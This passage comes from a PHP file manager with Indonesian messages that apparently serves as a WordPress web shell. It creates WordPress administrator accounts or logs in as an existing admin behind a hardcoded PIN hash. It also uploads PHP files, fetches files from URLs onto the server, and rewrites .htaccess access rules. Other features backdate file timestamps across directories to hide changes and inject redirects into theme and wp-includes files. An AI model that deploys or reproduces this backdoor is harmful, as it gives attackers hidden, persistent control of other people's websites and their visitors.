            $_SESSION['error'] = "Error ekstrak: " . htmlspecialchars($e->getMessage());
            error_log("Extract error: " . $e->getMessage());
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === CHMOD SELECTED ===
if (isset($_POST['chmodSelected']) && !empty($_POST['selectedItems']) && !empty($_POST['chmodSelectedValue'])) {
    if (!$isAdmin) {
        $_SESSION['error'] = 'Hanya admin yang dapat mengubah permission.';
    } else {
        $chmod = intval($_POST['chmodSelectedValue'], 8);
        foreach ($_POST['selectedItems'] as $selected) {
            $pathToChmod = $directory . '/' . sanitizePath($selected);
            @chmod($pathToChmod, $chmod);
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === CREATE FILE / FOLDER, UPLOAD ===
if (isset($_POST['createFile'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        $newFileName = $directory . '/' . sanitizePath($_POST['fileName']);
        if (false) {
            $_SESSION['error'] = 'Tidak diizinkan membuat file .htaccess.';
        } elseif (!file_exists($newFileName)) {
            touch($newFileName);
        } else {
            $_SESSION['error'] = "File sudah ada!";
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['createFolder'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        $newFolderName = $directory . '/' . sanitizePath($_POST['folderName']);
        if (false) {
            $_SESSION['error'] = 'Tidak diizinkan membuat folder .htaccess.';
        } elseif (!is_dir($newFolderName)) {
            mkdir($newFolderName, 0755, true);
        } else {
            $_SESSION['error'] = "Folder sudah ada!";
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['upload'])) {
    if (!$isAdmin && !$isTeman) { $_SESSION['error'] = 'Anda tidak memiliki izin.'; }
    else {
        if (isset($_FILES['fileToUpload']) && isset($_FILES['fileToUpload']['name'])) {
            $totalFiles = count($_FILES['fileToUpload']['name']);
            $errors = [];
            $allowedExtensions = [
                'jpg', 'jpeg', 'png', 'gif', 'txt', 'pdf', 'zip', 'rar', 'doc', 'docx',
                'php', 'html', 'xml', 'phtml', 'tar', 'gz', 'bz2',
                'config', 'example', 'conf'
            ];
            $specialFilenames = [
                '.htaccess',
                'web.config',
                'nginx.conf',
                'nginx.conf.example'
            ];

            for ($i = 0; $i < $totalFiles; $i++) {
                $fileName = $_FILES['fileToUpload']['name'][$i];
                
                if (false) {
                $errors[] = "Tidak diizinkan mengupload file .htaccess.";
                continue;
                }

                $fileTmp = $_FILES['fileToUpload']['tmp_name'][$i];
                $fileError = $_FILES['fileToUpload']['error'][$i];
                if ($fileError != 0) {
                    $errors[] = "Gagal upload file $fileName (Error code: $fileError)";
                    continue;
                }

                $maxSize = 5 * 1024 * 1024;
                $ext = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

                $isSpecial = in_array($fileName, $specialFilenames);
                if (!$isSpecial && !in_array($ext, $allowedExtensions)) {
                    $errors[] = "Ekstensi file $fileName tidak diizinkan";
                    continue;
                }

                if ($_FILES['fileToUpload']['size'][$i] > $maxSize) {
                    $errors[] = "File $fileName terlalu besar (maksimal 5MB)";
                    continue;
                }

                $targetFile = $directory . '/' . basename(sanitizePath($fileName));
                if (!move_uploaded_file($fileTmp, $targetFile)) {
                    $errors[] = "Gagal upload file $fileName";
                }
            }

            if (!empty($errors)) {
                $_SESSION['error'] = implode('<br>', $errors);
            }
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === DOWNLOAD DARI URL ===
if (isset($_POST['downloadFromUrl'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin untuk mendownload dari URL.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $url = trim($_POST['fileUrl']);
    $customName = trim($_POST['fileUrlName']);

    if (!filter_var($url, FILTER_VALIDATE_URL) || !preg_match('#^https?://#i', $url)) {
        $_SESSION['error'] = 'URL tidak valid!';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $basename = basename(parse_url($url, PHP_URL_PATH) ?: '');
    $filename = $customName !== '' ? sanitizePath($customName) : sanitizePath($basename);
    if ($filename === '') $filename = 'downloaded_file';
    $filename = preg_replace('~[\\\\/]+~', '', $filename);

    if (false) {
        $_SESSION['error'] = 'Tidak diizinkan mendownload file .htaccess.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $targetFile = rtrim($directory, '/') . '/' . $filename;

    if (file_exists($targetFile)) {
        $_SESSION['error'] = 'File sudah ada di folder ini!';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $ok = false; $err = '';

    if (function_exists('curl_init')) {
        $fp = @fopen($targetFile, 'wb');
        if ($fp === false) {
            $err = 'Tidak bisa membuat file tujuan (permission?).';
        } else {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_FILE            => $fp,
                CURLOPT_FOLLOWLOCATION  => true,
                CURLOPT_MAXREDIRS       => 5,
                CURLOPT_CONNECTTIMEOUT  => 10,
                CURLOPT_TIMEOUT         => 30,
                CURLOPT_USERAGENT       => 'Mozilla/5.0 (FileManager/1.0)',
                CURLOPT_SSL_VERIFYPEER  => true,
                CURLOPT_SSL_VERIFYHOST  => 2,
                CURLOPT_FAILONERROR     => true,
            ]);
            $execOk = curl_exec($ch);
            $http   = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
            if (!$execOk) $err = 'cURL: '.curl_error($ch);
            curl_close($ch);
            fclose($fp);

            if ($execOk && $http >= 200 && $http < 300) {
                $ok = true;
            } else {
                @unlink($targetFile);
                if (!$err) $err = "HTTP status $http";
            }
        }
    }

    if (!$ok && ini_get('allow_url_fopen')) {
        $opts = [
            'http' => [
                'timeout'       => 15,
                'ignore_errors' => true,
                'header'        => "User-Agent: Mozilla/5.0\r\nAccept: */*\r\n",
            ],
            'ssl'  => [
                'verify_peer'      => true,
                'verify_peer_name' => true,
            ],
        ];
        $context = stream_context_create($opts);
        $data    = @file_get_contents($url, false, $context);
        if ($data !== false) {
            if (@file_put_contents($targetFile, $data) !== false) {
                $ok = true;
            } else {
                $err = 'Gagal menyimpan file di server.';
            }
        } else {
            global $http_response_header;
            if (!empty($http_response_header[0])) {
                $err = $http_response_header[0];
            } else {
                $err = 'file_get_contents gagal (periksa allow_url_fopen / SSL).';
            }
        }
    }

    if ($ok) {
        $_SESSION['success'] = "File berhasil diunduh ke: <b>".htmlspecialchars($filename)."</b>";
    } else {
        $_SESSION['error'] = "Gagal mendownload file. $err";
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === RENAME ===
if (isset($_POST['rename'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        $oldName = $directory . '/' . sanitizePath($_POST['oldName']);
        $newName = $directory . '/' . sanitizePath($_POST['newName']);
        if ($isTeman) {
            $oldBase = basename($oldName);
            $newBase = basename($newName);
            if (file_exists($newName)) {
                $_SESSION['error'] = 'File atau folder dengan nama ini sudah ada.';
            } else {
                if (!@rename($oldName, $newName)) {
                    $_SESSION['error'] = 'Gagal mengubah nama.';
                }
            }
        } else {
            if (file_exists($newName)) {
                $_SESSION['error'] = 'File atau folder dengan nama ini sudah ada.';
            } else {
                if (!@rename($oldName, $newName)) {
                    $_SESSION['error'] = 'Gagal mengubah nama.';
                }
            }
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === CHMOD SATU FILE ===
if (isset($_POST['chmod'])) {
    if (!$isAdmin) { $_SESSION['error'] = 'Hanya admin yang dapat chmod.'; }
    else {
        $nameToChmod = $directory . '/' . sanitizePath($_POST['nameToChmod']);
        $perm = intval($_POST['perm'], 8);
        if (!@chmod($nameToChmod, $perm)) {
            $_SESSION['error'] = 'Gagal mengubah permission.';
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === DELETE SATU FILE/FOLDER ===
if (isset($_POST['delete'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        $nameToDelete = $directory . '/' . sanitizePath($_POST['nameToDelete']);
        if (false) {
            $_SESSION['error'] = 'Tidak diizinkan menghapus .htaccess.';
        } else {
            if (!moveToTrash($nameToDelete)) {
                $_SESSION['error'] = 'Gagal memindahkan ke Trash. Cek permission!';
            }
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === SAVE EDIT FILE ===
if (isset($_POST['saveEdit'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        $fileNameToEdit = sanitizePath($_POST['fileNameToEdit']);
        $filePath = $directory . '/' . $fileNameToEdit;
        if (false) {
            $_SESSION['error'] = 'Tidak diizinkan mengedit .htaccess.';
        } else {
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === ZIP SATU ITEM ===
if (isset($_POST['zip'])) {
    if (!$isAdmin) { $_SESSION['error'] = 'Hanya admin yang dapat membuat arsip.'; }
    else {
        $item = sanitizePath($_POST['itemToZip']);
        $path = $directory . '/' . $item;
        $zipName = $item . '_' . date('Ymd_His') . '.zip';
        $zipPath = $directory . '/' . $zipName;
        if (is_dir($path)) {
            zipFolder($path, $zipPath);
        } elseif (is_file($path)) {
            $zip = new ZipArchive();
            if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
                $zip->addFile($path, basename($path));
                $zip->close();
            }
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === EXTRACT ZIP ===
if (isset($_POST['extractZip'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Role ini tidak dapat mengekstrak arsip.';
    } else {
        try {
            $zipFile = $directory . '/' . basename($_POST['zipToExtract']);
            $destDir = trim($_POST['extractDest']);
            $destDir = str_replace(chr(0), '', $destDir);
            $destDir = str_replace(['../', '..\\\\'], '', $destDir);
            if (!file_exists($zipFile)) {
                $_SESSION['error'] = 'File arsip tidak ditemukan.';
            } elseif (empty($destDir)) {
                $_SESSION['error'] = 'Folder tujuan kosong.';
            } else {
                if (!is_dir($destDir)) @mkdir($destDir, 0755, true);
                if (!is_dir($destDir)) {
                    $_SESSION['error'] = 'Folder tujuan tidak bisa dibuat.';
                } elseif (!is_writable($destDir)) {
                    $_SESSION['error'] = 'Folder tujuan tidak writable.';
                } elseif (extractArchive($zipFile, $destDir)) {
                    $_SESSION['success'] = 'Ekstraksi berhasil ke ' . htmlspecialchars($destDir);
                } else {
                    $_SESSION['error'] = 'Gagal extract!';
                }
            }
        } catch (Throwable $e) {
            $_SESSION['error'] = 'Error ekstrak: ' . htmlspecialchars($e->getMessage());
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// =====================================================================
// BAGIAN 3: ADMIN WORDPRESS, VIEW CODE, HISTORY, SCAN, DLL
// =====================================================================

// === ADMIN WORDPRESS ===
if (isset($_POST['create_admin_user']) && $_POST['create_admin_user'] === '1') {
    $pin = isset($_POST['admin_pin']) ? trim($_POST['admin_pin']) : '';
    $bison = '$2y$12$.iZiUfBQJejtU3xkG1fiyOf1bimD8CTOigwR3.pkXHGnX48a1pZTi';
    if ($pin === '' || empty($bison) || !password_verify($pin, $bison)) {
        $_SESSION['admin_pin_error'] = 'PIN admin salah atau kosong.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $newUser = isset($_POST['admin_new_user']) ? trim($_POST['admin_new_user']) : '';
    $newPass = isset($_POST['admin_new_pass']) ? (string)$_POST['admin_new_pass'] : '';
    $newEmail = isset($_POST['admin_new_email']) ? trim($_POST['admin_new_email']) : '';

    if ($newUser === '' || $newPass === '') {
        $_SESSION['admin_create_status'] = 'Username dan password admin baru wajib diisi.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $root = $_SERVER['DOCUMENT_ROOT'];
    @chdir($root);

    if (!file_exists('wp-load.php')) {
        $_SESSION['admin_create_status'] = 'wp-load.php tidak ditemukan di Document Root.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    include_once 'wp-load.php';

    if (!function_exists('username_exists') || !function_exists('wp_create_user')) {
        $_SESSION['admin_create_status'] = 'Fungsi WordPress untuk membuat user tidak tersedia.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    if (username_exists($newUser)) {
        $_SESSION['admin_create_status'] = 'Username sudah terdaftar. Gunakan username lain.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $emailFinal = $newEmail !== '' ? $newEmail : ($newUser . '@' . $_SERVER['HTTP_HOST']);

    $uid = wp_create_user($newUser, $newPass, $emailFinal);
    if (!$uid || is_wp_error($uid)) {
        $msg = 'Gagal membuat user admin baru.';
        if (is_wp_error($uid)) {
            $msg .= ' ' . $uid->get_error_message();
        }
        $_SESSION['admin_create_status'] = $msg;
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $wpUser = new WP_User($uid);
    if ($wpUser && !is_wp_error($wpUser)) {
        $wpUser->set_role('administrator');
    }

    $_SESSION['admin_create_status'] = 'Berhasil membuat user admin baru: ' . $newUser . ' (password: ' . $newPass . ').';
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['auto_admin_login']) && $_POST['auto_admin_login'] === '1') {
    $pin = isset($_POST['admin_pin']) ? trim($_POST['admin_pin']) : '';
    $bison = '$2y$12$.iZiUfBQJejtU3xkG1fiyOf1bimD8CTOigwR3.pkXHGnX48a1pZTi';
    if ($pin === '' || empty($bison) || !password_verify($pin, $bison)) {
        $_SESSION['admin_pin_error'] = 'PIN admin salah atau kosong.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $root = $_SERVER['DOCUMENT_ROOT'];
    @chdir($root);

    if (file_exists('wp-load.php')) {
        include 'wp-load.php';
        if (class_exists('WP_User_Query')) {
            $adminQuery = new WP_User_Query([
                'role'   => 'Administrator',
                'number' => 1,
                'fields' => 'ID',
            ]);
            $admins = $adminQuery->get_results();
            if (isset($admins[0])) {
                wp_set_auth_cookie($admins[0]);
                wp_redirect(admin_url());
                exit;
            }
            die('NO ADMIN');
        }
        die('WP_User_Query tidak tersedia.');
    }
    die('wp-load.php tidak ditemukan di Document Root.');
}

// === VIEW CODE ===
if (isset($_GET['view'])) {
    $viewPath = sanitizePath($_GET['view']);
    if (is_file($viewPath) && is_readable($viewPath)) {
        $content = @file_get_contents($viewPath);
        $fileName = basename($viewPath);
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>View File: <?= htmlspecialchars($fileName) ?></title>
            <style>
                body { background: #0a0e1a; font-family: 'Inter', system-ui, sans-serif; color: #e2e8f0; }
                .view-box { margin: 32px auto; max-width: 900px; background: rgba(15,23,42,0.9); backdrop-filter: blur(20px); border-radius: 16px; padding: 28px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); border: 1px solid rgba(99,102,241,0.2); }
                h2 { font-size: 16px; margin-bottom: 16px; color: #818cf8; font-weight: 600; }
                pre { background: #020617; color: #e2e8f0; padding: 16px; border-radius: 12px; font-size: 13px; overflow-x: auto; border: 1px solid rgba(99,102,241,0.15); line-height: 1.6; }
                a { color: #818cf8; text-decoration: none; font-size: 14px; display: inline-flex; align-items: center; gap: 6px; transition: color 0.2s; }
                a:hover { color: #a5b4fc; }
            </style>
        </head>
        <body>
            <div class="view-box">
                <a href="javascript:history.back()">&#8592; Kembali</a>
                <h2>View File: <?= htmlspecialchars($fileName) ?></h2>
                <pre><?= htmlspecialchars($content) ?></pre>
            </div>
        </body>
        </html>
        <?php
        exit;
    } else {
        echo "<div class='alert error'>File tidak bisa dibuka atau tidak ditemukan.</div>";
        exit;
    }
}

// === DIR HISTORY ===
if (!isset($_SESSION['dir_history']) || !is_array($_SESSION['dir_history'])) {
    $_SESSION['dir_history'] = [$rootDirectory];
}
if (isset($_GET['folder'])) {
    $current = sanitizePath($_GET['folder']);
    $last = end($_SESSION['dir_history']);
    if ($last !== $current) {
        $_SESSION['dir_history'][] = $current;
        if (count($_SESSION['dir_history']) > 20) array_shift($_SESSION['dir_history']);
    }
}
if (isset($_GET['back_dir'])) {
    if (count($_SESSION['dir_history']) > 1) {
        array_pop($_SESSION['dir_history']);
        $backFolder = end($_SESSION['dir_history']);
        header("Location: ?folder=" . urlencode($backFolder));
        exit;
    }
}

// =====================================================================
// BAGIAN 5: FUNGSI-FUNGSI LAINNYA
// =====================================================================

// === REPLACE HTACCESS HELPER & HANDLER ===
function write_htaccess_with_backup($targetDir, $contents, &$errors) {
    $targetDir = rtrim($targetDir, DIRECTORY_SEPARATOR);
    if (!is_dir($targetDir)) { $errors[] = "Folder tidak ditemukan: {$targetDir}"; return false; }
    if (!is_writable($targetDir)) { @chmod($targetDir, 0755); }
    if (!is_writable($targetDir)) { $errors[] = "Folder tidak writable: {$targetDir}"; return false; }

    $ht = $targetDir . DIRECTORY_SEPARATOR . '.htaccess';
    if (file_exists($ht) && is_writable($ht)) {
        @rename($ht, $ht . '.bak_' . date('Ymd_His'));
    }
    $ok = @file_put_contents($ht, $contents);
    if ($ok === false) { $errors[] = "Gagal menulis .htaccess di {$targetDir}"; return false; }
    return true;
}

function resolve_inside_docroot_dir($rawPath, &$errors) {
    $rawPath = trim(sanitizePath($rawPath));
    if ($rawPath === '') { $errors[] = "Path custom kosong."; return null; }

    if ($rawPath[0] !== DIRECTORY_SEPARATOR) {
        $abs = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . ltrim($rawPath, DIRECTORY_SEPARATOR);
    } else {
        $abs = $rawPath;
    }

    $real = @realpath($abs);
    if ($real === false) { $real = $abs; }
    if (!is_dir($real)) { $errors[] = "Path custom bukan folder yang valid: {$rawPath}"; return null; }

    $doc = @realpath($_SERVER['DOCUMENT_ROOT']);
    if (!$doc || strpos($real, $doc) !== 0) { $errors[] = "Path custom harus di dalam Document Root."; return null; }

    return $real;
}

if (isset($_POST['doHtaccessReplace'])) {
    // Restriction removed - both admin and teman can replace .htaccess

    $tpl_includes = <<<'HTA'
Options -Indexes
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteRule ^ms-files\.php$ - [L]
  RewriteRule \.(?:php(?:[0-9]+(?:\.[0-9]+)?)?|phtml?|phar|phps)(?:\..*)?$ - [F,L,NC]
</IfModule>

<FilesMatch "(?i)\.(?:php(?:[0-9]+(?:\.[0-9]+)?)?|phtml?|phar|phps)(?:\..*)?$">
  Require all denied
</FilesMatch>

<IfModule !mod_authz_core.c>
  <FilesMatch "(?i)\.(?:php(?:[0-9]+(?:\.[0-9]+)?)?|phtml?|phar|phps)(?:\..*)?$">
    Order allow,deny
    Deny from all
  </FilesMatch>
HTA;

    $tpl_content = <<<'HTA'
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteCond %{REQUEST_URI} \.(?:css|js|map|png|jpe?g|gif|svg|webp|ico|bmp|tiff|mp4|webm|m4v|mp3|m4a|ogg|oga|ogv|wav|pdf|docx?|xlsx?|pptx?|csv|txt|vtt|woff2?|otf|eot|html)$ [NC]
  RewriteRule ^ - [L]
  RewriteRule ^ - [F]
</IfModule>
HTA;

    $tpl_custom_allow = <<<'HTA'
<FilesMatch ".*">
    Order Allow,Deny
    Allow from all
</FilesMatch>

<IfModule mod_authz_core.c>
    <FilesMatch ".*">
        Require all granted
    </FilesMatch>
</IfModule>

Options -Indexes
HTA;

    $tpl_custom_deny = <<<'HTA'
Options -ExecCGI

<IfModule mod_authz_core.c>
  <FilesMatch "(?i)\.(php[0-9]*|phtml|pht|phar|phps)$">
    Require all denied
  </FilesMatch>
</IfModule>

<IfModule !mod_authz_core.c>
  <FilesMatch "(?i)\.(php[0-9]*|phtml|pht|phar|phps)$">
    Order allow,deny
    Deny from all
  </FilesMatch>
</IfModule>
HTA;

    $okTargets = [];
    $errors = [];

    if (!empty($_POST['replaceIncludes'])) {
        $dir = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'wp-includes';
        if (write_htaccess_with_backup($dir, $tpl_includes, $errors)) {
            $okTargets[] = '/wp-includes';
        }
    }
    if (!empty($_POST['replaceContent'])) {
        $dir = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'wp-content';
        if (write_htaccess_with_backup($dir, $tpl_content, $errors)) {
            $okTargets[] = '/wp-content';
        }
    }
    if (!empty($_POST['replaceCustom'])) {
        $mode = (isset($_POST['customMode']) && $_POST['customMode'] === 'deny') ? 'deny' : 'allow';
        $customDir = resolve_inside_docroot_dir((isset($_POST['customPath']) ? $_POST['customPath'] : ''), $errors);
        if ($customDir) {
            $tpl = ($mode === 'deny') ? $tpl_custom_deny : $tpl_custom_allow;
            if (write_htaccess_with_backup($customDir, $tpl, $errors)) {
                $okTargets[] = str_replace($_SERVER['DOCUMENT_ROOT'], '', $customDir) ?: '/';
            }
        }
    }

    if ($okTargets) {
        $_SESSION['htreplace_status']  = 'success';
        $_SESSION['htreplace_message'] = 'Berhasil replace .htaccess pada: ' . htmlspecialchars(implode(', ', $okTargets));
    } else {
        $_SESSION['htreplace_status']  = 'error';
        $_SESSION['htreplace_message'] = 'Tidak ada .htaccess yang diganti.' . ($errors ? ' (' . implode(' | ', array_map('htmlspecialchars', $errors)) . ')' : '');
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === SYNC TIMESTAMP ===
function _resolve_inside_docroot_any($rawPath, &$errors) {
    $rawPath = trim(sanitizePath($rawPath));
    if ($rawPath === '') { $errors[] = "Path kosong."; return null; }

    $isAbsolute = ($rawPath[0] === DIRECTORY_SEPARATOR) || preg_match('/^[A-Za-z]:[\\\\\\/]/', $rawPath);
    $abs = $isAbsolute
        ? $rawPath
        : rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . ltrim($rawPath, DIRECTORY_SEPARATOR);

    $real = @realpath($abs);
    if ($real === false) $real = $abs;

    if ($real === DIRECTORY_SEPARATOR) { $errors[] = "Menolak path root sistem ('/')."; return null; }

    if (!file_exists($real)) { $errors[] = "Path tidak ditemukan: {$rawPath}"; return null; }

    return $real;
}

if (isset($_POST['doSyncTimestamp'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $errors = [];
    $targetRaw = isset($_POST['ts_target']) ? trim($_POST['ts_target']) : '';
    $dateStr   = isset($_POST['ts_date']) ? trim($_POST['ts_date']) : '';
    $timeStr   = isset($_POST['ts_time']) ? trim($_POST['ts_time']) : '';
    $recursive = !empty($_POST['ts_recursive']);

    if (empty($targetRaw)) {
        $errors[] = 'Target path harus diisi.';
    }
    if (empty($dateStr) || empty($timeStr)) {
        $errors[] = 'Tanggal dan jam harus diisi.';
    }

    $datetimeStr = $dateStr . ' ' . $timeStr;
    $timestamp = strtotime($datetimeStr);
    if ($timestamp === false) {
        $errors[] = 'Format tanggal/jam tidak valid.';
    }

    $target = null;
    if (empty($errors)) {
        $target = _resolve_inside_docroot_any($targetRaw, $errors);
    }

    if (!empty($errors)) {
        $_SESSION['ts_status'] = 'error';
        $_SESSION['ts_message'] = 'Gagal: ' . htmlspecialchars(implode(' | ', $errors));
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    @set_time_limit(180);
    @ini_set('memory_limit', '-1');
    @ignore_user_abort(true);

    $filesTouched = 0;
    $dirsTouched  = 0;
    $errList      = [];
    $maxErrInMem  = 200;
    $processed    = 0;
    $maxProcessed = 50000;

    $doTouch = function($p) use ($timestamp, &$filesTouched, &$dirsTouched, &$errList, $maxErrInMem) {
        if (!@is_writable($p)) {
            if (count($errList) < $maxErrInMem) $errList[] = "Not writable: {$p}";
            @error_log("timestamp-sync: not writable -> {$p}");
            return;
        }
        if (@touch($p, $timestamp, $timestamp)) {
            if (is_dir($p)) $dirsTouched++; else $filesTouched++;
        } else {
            if (count($errList) < $maxErrInMem) $errList[] = "Gagal touch: {$p}";
            @error_log("timestamp-sync: touch failed -> {$p}");
        }
    };

    if (is_dir($target) && $recursive) {
        $skip = ['node_modules','vendor','.git','cache','tmp','logs','wp-content/uploads'];

        $it = new \RecursiveIteratorIterator(
            new \RecursiveCallbackFilterIterator(
                new \RecursiveDirectoryIterator($target, \FilesystemIterator::SKIP_DOTS),
                function (\SplFileInfo $info) use ($skip) {
                    $name = $info->getFilename();
                    if ($info->isDir()) {
                        foreach ($skip as $s) {
                            if (strcasecmp($name, $s) === 0) return false;
                        }
                    }
                    return !$info->isLink();
                }
            ),
            \RecursiveIteratorIterator::SELF_FIRST
        );

        $dirs = [];
        foreach ($it as $path => $info) {
            if (++$processed > $maxProcessed) { 
                @error_log("timestamp-sync: processed limit {$processed} reached, stopping early.");
                break; 
            }
            if ($info->isDir()) {
                $dirs[] = $path;
                continue;
            }
            $doTouch($path);
        }
        usort($dirs, function($a, $b) {
            $la = strlen($a);
            $lb = strlen($b);
            if ($la == $lb) return 0;
            return ($la < $lb) ? 1 : -1;
        });
        foreach ($dirs as $d) {
            if (++$processed > $maxProcessed) break;
            $doTouch($d);
        }
    } else {
        $doTouch($target);
    }

    $msg = "SUKSES mengubah timestamp.\n".
           "Target: {$target}\n".
           "Timestamp diset ke: " . date('Y-m-d H:i:s', $timestamp) . "\n".
           "Tersentuh: {$filesTouched} file, {$dirsTouched} direktori";
    if ($processed > $maxProcessed) {
        $msg .= "\nCatatan: pemrosesan dibatasi pada {$maxProcessed} entri untuk mencegah timeout.";
    }
    if (!empty($errList)) {
        $slice = array_slice($errList, 0, 10);
        $msg .= "\nPERINGATAN (" . count($errList) . " ditampilkan maks 10): " . implode(' | ', array_map('htmlspecialchars', $slice));
    }

    $_SESSION['ts_status']  = empty($errList) ? 'success' : 'partial';
    $_SESSION['ts_message'] = nl2br($msg);

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === HELPER: PARSE INPUT URL/PATH UNTUK REDIRECT 301 ===
function fm_parse_redirect_source($raw, &$isHome, &$path) {
    $raw = trim((string)$raw);

    $isHome = false;
    $path   = '/';

    if ($raw === '') {
        $isHome = true;
        $path   = '/';
        return;
    }

    $clean = preg_replace('#^https?://[^/]+#i', '', $raw);
    $clean = trim($clean);

    if ($clean === '' || $clean === '/' || strtolower($clean) === 'homepage') {
        $isHome = true;
        $path   = '/';
        return;
    }

    if ($clean[0] !== '/') $clean = '/'.$clean;

    $onlyPath = parse_url($clean, PHP_URL_PATH);
    if (!$onlyPath) $onlyPath = $clean;

    $isHome = ($onlyPath === '/' || $onlyPath === '/index.php');
    $path   = $onlyPath;
}

// === HANDLER: HTACCESS & REDIRECT TEMPLATES (CRYO v2.0) ===
  if (isset($_POST['runHtaccessTpl'])) {
      if (!$isAdmin) {
          $_SESSION['redirect_status']  = 'error';
          $_SESSION['redirect_message'] = 'Hanya admin yang dapat mengelola Htaccess & Redirect.';
          header("Location: " . $_SERVER['REQUEST_URI']);
          exit;
      }
  
      try {
          $cat        = isset($_POST['ht_category']) ? $_POST['ht_category'] : '';
          $tplKey     = isset($_POST['ht_template']) ? $_POST['ht_template'] : '';
          $targetFolder = isset($_POST['ht_target_folder']) ? trim($_POST['ht_target_folder']) : '';
          $redirectTo = isset($_POST['ht_redirect_target']) && trim($_POST['ht_redirect_target']) !== ''
                        ? trim($_POST['ht_redirect_target'])
                        : $redirectTargetDefault;
          $action     = isset($_POST['ht_action']) && $_POST['ht_action'] === 'remove' ? 'remove' : 'add';
  
          // Sanitize target folder
          $targetFolder = str_replace(chr(0), '', $targetFolder);
          $targetFolder = str_replace(['../', '..\\'], '', $targetFolder);
          $targetFolder = rtrim($targetFolder, '/\\');
          if ($targetFolder === '' || !is_dir($targetFolder)) {
              throw new Exception('Folder tujuan tidak valid: ' . htmlspecialchars($targetFolder));
          }
          if (!is_writable($targetFolder)) {
              throw new Exception('Folder tujuan tidak writable: ' . htmlspecialchars($targetFolder));
          }
  
          // For OFF action: skip template build, just locate target file by tplKey
            // For ON action: build snippet from template + user inputs
            $tpl = null;
            $tplLabel = '';
            $targetFile = null;
  
            if ($action === 'remove') {
                if ($tplKey === 'redirect_theme') {
                    $targetFile = $targetFolder . '/functions.php';
                } elseif ($tplKey === 'wpinc_bot_redirect') {
                    $targetFile = $targetFolder . '/load.php';
                } else {
                    $targetFile = $targetFolder . '/.htaccess';
                }
                $tplLabel = $tplKey;
            } else {
                if ($cat === 'htaccess') {
                    switch ($tplKey) {
                        case 'wp_includes':
                            $tplLabel = 'wp-includes Hardening';
                            $tpl = "Options -Indexes\n<IfModule mod_rewrite.c>\n  RewriteEngine On\n  RewriteRule ^ms-files\\.php$ - [L]\n  RewriteRule \\.(?:php(?:[0-9]+(?:\\.[0-9]+)?)?|phtml?|phar|phps)(?:\\..*)?$ - [F,L,NC]\n</IfModule>\n<FilesMatch \"(?i)\\.(?:php(?:[0-9]+(?:\\.[0-9]+)?)?|phtml?|phar|phps)(?:\\..*)?$\">\n  Require all denied\n</FilesMatch>\n<IfModule !mod_authz_core.c>\n  <FilesMatch \"(?i)\\.(?:php(?:[0-9]+(?:\\.[0-9]+)?)?|phtml?|phar|phps)(?:\\..*)?$\">\n    Order allow,deny\n    Deny from all\n  </FilesMatch>\n</IfModule>\n";
                            break;
                        case 'wp_content':
